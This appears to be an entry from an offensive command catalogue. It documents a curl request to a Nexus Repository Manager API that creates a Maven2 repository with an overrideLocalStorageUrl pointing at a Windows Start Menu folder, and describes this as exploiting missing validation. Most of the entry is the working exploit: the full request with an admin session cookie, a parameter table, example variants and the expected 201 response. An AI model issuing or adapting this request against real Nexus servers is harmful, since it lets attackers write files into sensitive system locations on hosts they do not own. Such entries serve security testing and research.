---
id: d4e5f6g7-h8i9-0123-defg-456789012345
data: >-
  curl -X POST 'http://nexus-host:8081/nexus/service/local/repositories' -H
  'Content-Type: application/json' -H 'Cookie:
  NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770' -d
  '{"data":{"repoType":"hosted","id":"5000","name":"MyTestRepo","writePolicy":"ALLOW_WRITE_ONCE","browseable":true,"indexable":true,"exposed":true,"notFoundCacheTTL":1440,"repoPolicy":"RELEASE","provider":"maven2","providerRole":"org.sonatype.nexus.proxy.repository.Repository","overrideLocalStorageUrl":"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start
  Menu","downloadRemoteIndexes":false,"checksumPolicy":"IGNORE"}}'
tags:
  - nexus
  - repository-creation
type: command
output: >-
  HTTP/1.1 201 Created

  Content-Type: application/json

  {"data":{"id":"5000","name":"MyTestRepo","defaultLocalStorageUrl":"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start
  Menu",...}}
executor: bash
platforms:
  - Web
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:10.449Z'
verified: false
validated: true
submitted: true
---
# curl-create-custom-repo

## Command

```bash
curl -X POST 'http://nexus-host:8081/nexus/service/local/repositories' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770' \
  -d '{"data":{"repoType":"hosted","id":"5000","name":"MyTestRepo","writePolicy":"ALLOW_WRITE_ONCE","browseable":true,"indexable":true,"exposed":true,"notFoundCacheTTL":1440,"repoPolicy":"RELEASE","provider":"maven2","providerRole":"org.sonatype.nexus.proxy.repository.Repository","overrideLocalStorageUrl":"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu","downloadRemoteIndexes":false,"checksumPolicy":"IGNORE"}}'
```

## Description

Creates a hosted Maven2 repository in Nexus with an arbitrary overrideLocalStorageUrl to point to a sensitive Windows path, exploiting lack of validation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method for creation | Yes |
| `http://nexus-host:8081/nexus/service/local/repositories` | Endpoint URL | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON payload type | Yes |
| `-H 'Cookie: NXSESSIONID=...'` | Admin session cookie | Yes |
| `-d '{...}'` | JSON payload with repo details and overrideLocalStorageUrl | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'http://nexus-host:8081/nexus/service/local/repositories' -H 'Content-Type: application/json' -H 'Cookie: NXSESSIONID=your-session' -d '{"data":{"repoType":"hosted","id":"5000","name":"MyTestRepo","overrideLocalStorageUrl":"file:/c:/path/to/sensitive"}}'
```

### Advanced Usage

Include full defaults as in the command for production-like setup.

## Expected Output

HTTP 201 Created response with JSON confirming repository creation and the overridden storage URL.

## Related

- [[procedures/Create-Custom-Maven-Repository-with-Arbitrary-Storage-Path]]
